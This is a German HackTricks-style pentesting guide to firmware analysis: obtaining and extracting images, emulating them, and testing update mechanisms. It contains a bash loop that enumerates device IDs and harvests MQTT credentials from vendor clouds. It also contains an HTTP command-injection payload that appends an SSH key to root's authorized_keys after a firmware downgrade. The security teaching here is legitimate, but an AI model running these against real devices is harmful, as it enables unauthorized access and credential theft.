# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware ist essenzielle Software, die Geräte funktionsfähig macht, indem sie die Kommunikation zwischen Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und ermöglicht. Sie wird in permanentem Speicher abgelegt, sodass das Gerät von dem Moment an relevante Anweisungen abrufen kann, in dem es eingeschaltet wird, was letztlich zum Start des Betriebssystems führt. Die Untersuchung und gegebenenfalls Modifikation von Firmware ist ein kritischer Schritt zur Identifizierung von Sicherheitslücken.

## **Informationsbeschaffung**

**Informationsbeschaffung** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- Der CPU-Architektur und dem verwendeten Betriebssystem
- Bootloader-spezifischen Details
- Hardware-Layout und Datenblättern
- Metriken der Codebasis und Quellorten
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Flussdiagrammen
- Sicherheitsbewertungen und identifizierten Schwachstellen

Für diesen Zweck sind **open-source intelligence (OSINT)**-Tools äußerst wertvoll, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Überprüfungen. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analyse, die genutzt werden kann, um potenzielle Probleme zu finden.

## **Firmware beschaffen**

Das Erhalten von Firmware kann auf verschiedene Weisen erfolgen, jede mit unterschiedlichem Schwierigkeitsgrad:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** aus den bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Nutzung von **Google dork**-Queries, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **cloud storage**, z. B. mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **updates** mittels man-in-the-middle-Techniken
- **Extrahieren** vom Gerät über Schnittstellen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen in der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entnehmen und Auslesen** des Speichenchips, wenn alles andere fehlschlägt, unter Verwendung geeigneter Hardware-Tools

## Firmware analysieren

Jetzt, da Sie die **Firmware haben**, müssen Sie Informationen daraus extrahieren, um zu wissen, wie Sie weiter vorgehen. Verschiedene Tools, die Sie dafür verwenden können:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **entropy** des Images mit `binwalk -E <bin>`; bei niedriger entropy ist es unwahrscheinlich, dass es verschlüsselt ist. Bei hoher entropy ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **Dateien zu extrahieren, die im Firmware-Image eingebettet sind**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) zur Inspektion der Datei.

### Zugriff auf das Dateisystem

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, benannt nach dem Dateisystemtyp**, welcher üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Extraktion des Dateisystems

Manchmal hat binwalk **das Magic-Byte des Dateisystems nicht in seinen Signaturen**. In solchen Fällen benutze binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem aus der Binärdatei auszuschneiden (carve)** und das Dateisystem entsprechend seinem Typ **manuell zu extrahieren**, indem du die folgenden Schritte anwendest.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, um das Squashfs filesystem zu carve.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch folgender Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- Für CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dieser Prozess umfasst die Verwendung verschiedener Tools, um Daten aus dem Firmware-Image zu analysieren und zu extrahieren.

### Erste Analyse-Tools

Eine Reihe von Befehlen wird für die erste Inspektion der Binärdatei (als `<bin>` bezeichnet) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Partition- sowie Dateisystemdetails zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Niedrige Entropie deutet auf fehlende Verschlüsselung hin, während hohe Entropie auf mögliche Verschlüsselung oder Kompression hinweist.

Für das Extrahieren von **embedded files** werden Tools und Ressourcen wie die Dokumentation von **file-data-carving-recovery-tools** und **binvis.io** zur Dateiansicht empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man in der Regel das Dateisystem extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn jedoch **binwalk** aufgrund fehlender Magic-Bytes den Dateisystemtyp nicht erkennt, ist eine manuelle Extraktion erforderlich. Dabei verwendet man `binwalk`, um den Offset des Dateisystems zu finden, gefolgt vom `dd`-Befehl, um das Dateisystem auszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystem-Analyse

Nachdem das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Der Fokus liegt auf unsicheren Netzwerkdaemons, hardcodierten Zugangsdaten, API-Endpunkten, Update‑Server‑Funktionalitäten, nicht kompiliertem Code, Startskripten und kompilierten Binärdateien zur Offline‑Analyse.

**Wichtige Orte** und **Elemente**, die untersucht werden sollten, sind:

- **etc/shadow** und **etc/passwd** für Benutzeranmeldeinformationen
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf mögliche Schwachstellen
- Eingebettete Binärdateien für weitere Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools unterstützen beim Aufspüren sensibler Informationen und Schwachstellen im Dateisystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen an kompilierten Binärdateien

Sowohl Quellcode als auch im Dateisystem gefundene, kompilierte Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Ermitteln von Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens

Viele IoT-Hubs holen ihre gerätespezifische Konfiguration von einem Cloud-Endpoint, der wie folgt aussieht:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Bei der Firmware-Analyse kann man feststellen, dass <token> lokal aus der device ID unter Verwendung eines hardcodierten Secrets abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hex in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der deviceId und STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, was häufig Klartext-MQTT-Zugangsdaten und Topic-Präfixe offenlegt.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Schließe einen 3,3V UART-Adapter (TX/RX/GND) an und zeichne die Logs auf:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das cloud config URL pattern und die broker address ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und token-Algorithmus aus der Firmware wiederherstellen

- Lade Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den token in Bash ab und schreibe den Digest in Großbuchstaben:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Harvest cloud config und MQTT credentials

- URL zusammenstellen und JSON mit curl abrufen; mit jq parsen, um secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Ausnutzen von plaintext MQTT und schwachen topic ACLs (falls vorhanden)

- Verwende wiederhergestellte credentials, um dich bei maintenance topics zu subscriben und nach sensitiven events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare Geräte-IDs auflisten (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme betten vendor OUI/product/type-Bytes ein, gefolgt von einem sequentiellen Suffix.
- Sie können Kandidaten-IDs iterieren, Tokens ableiten und Konfigurationen programmatisch abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer eine ausdrückliche Autorisierung ein, bevor du mass enumeration versuchst.
- Wenn möglich, bevorzuge emulation oder static analysis, um secrets zu gewinnen, ohne die Zielhardware zu verändern.

Der Prozess des Emulierens von Firmware ermöglicht **dynamic analysis** sowohl des Betriebs eines Geräts als auch eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des root filesystem oder bestimmter Binaries auf ein Gerät mit matching architecture and endianness, wie z. B. ein Raspberry Pi, oder auf eine pre-built virtual machine, kann weitere Tests erleichtern.

### Emulieren einzelner Binaries

Für die Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU architecture des Programms zu identifizieren.

#### Beispiel mit MIPS-Architektur

Um ein MIPS-Binary zu emulieren, kann man folgenden Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationswerkzeuge zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### Emulation der ARM-Architektur

Bei ARM-Binaries ist der Prozess ähnlich; der Emulator `qemu-arm` wird zur Emulation verwendet.

### Vollständige System-Emulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In diesem Stadium wird zur Analyse entweder eine echte oder eine emulierte Geräteumgebung verwendet. Es ist essenziell, Shellzugang zum OS und Dateisystem zu behalten. Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, was gelegentliche Neustarts der Emulation erforderlich macht. Die Analyse sollte das Dateisystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen erkunden. Firmware-Integritätstests sind entscheidend, um mögliche Backdoor-Schwachstellen zu identifizieren.

## Laufzeitanalyse-Techniken

Laufzeitanalyse beinhaltet das Interagieren mit einem Prozess oder Binary in seiner Laufumgebung, wobei Tools wie gdb-multiarch, Frida und Ghidra zum Setzen von Breakpoints und zur Identifikation von Schwachstellen durch Fuzzing und andere Techniken verwendet werden.

## Binary-Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für gefundene Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in Low-Level-Sprachen. Laufzeitschutzmechanismen für Binaries in Embedded-Systemen sind selten, aber wenn vorhanden, können Techniken wie Return Oriented Programming (ROP) notwendig sein.

## Vorgefertigte Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, ausgestattet mit den notwendigen Tools.

## Vorgefertigte OSs zur Analyse von Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die Ihnen hilft, Sicherheitsassessments und pentesting von Internet of Things (IoT)-Geräten durchzuführen. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für Embedded-Security-Tests, basierend auf Ubuntu 18.04 und mit vorinstallierten Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe & unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptographische Signaturprüfungen für Firmware-Images implementiert, wird der **Version-Rollback (Downgrade)-Schutz häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader lediglich die Signatur mittels eines eingebetteten öffentlichen Schlüssels überprüft, aber die *Version* (oder einen monotonen Zähler) des zu flashenden Images nicht vergleicht, kann ein Angreifer legal eine **ältere, verwundbare Firmware installieren, die weiterhin eine gültige Signatur trägt**, und so gepatchte Schwachstellen wieder einführen.

Typischer Angriffsablauf:

1. **Älteres signiertes Image beschaffen**
   * Vom öffentlichen Download-Portal des Vendors, CDN oder Support-Portal herunterladen.
   * Aus Begleit-Apps für Mobile/Desktop extrahieren (z. B. innerhalb einer Android APK unter `assets/firmware/`).
   * Aus Drittanbieter-Repositorien wie VirusTotal, Internet-Archiven, Foren etc. abrufen.
2. **Das Image über einen beliebigen offenen Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * Viele Consumer-IoT-Geräte bieten *unauthentifizierte* HTTP(S)-Endpunkte, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und Recovery/Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version gepatcht wurde (z. B. ein später hinzugefügter Command-Injection-Filter).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um nach Erlangung von Persistence eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der anfälligen (downgraded) Firmware wird der `md5`-Parameter direkt in einen shell command ohne Sanitierung eingefügt, wodurch die Injektion beliebiger Befehle möglich wird (hier – enabling SSH key-based root access). Spätere Firmware-Versionen führten einen einfachen Zeichensatzfilter ein, aber das Fehlen von downgrade protection macht den Fix wirkungslos.

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln komplette Firmware-Images in ihren Begleit-Apps, damit die App das Gerät über Bluetooth/Wi‑Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` abgelegt. Tools wie `apktool`, `ghidra` oder sogar einfaches `unzip` erlauben es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**, bevor geflasht wird?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. werden Signaturen vom ROM-Code geprüft)?
* Führt Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionstabelle, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Flows dieselbe Validierungslogik?

> 💡  Wenn eines der oben genannten fehlt, ist die Plattform wahrscheinlich für Rollback-Angriffe anfällig.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, verwenden Sie die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training und Zertifizierung

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
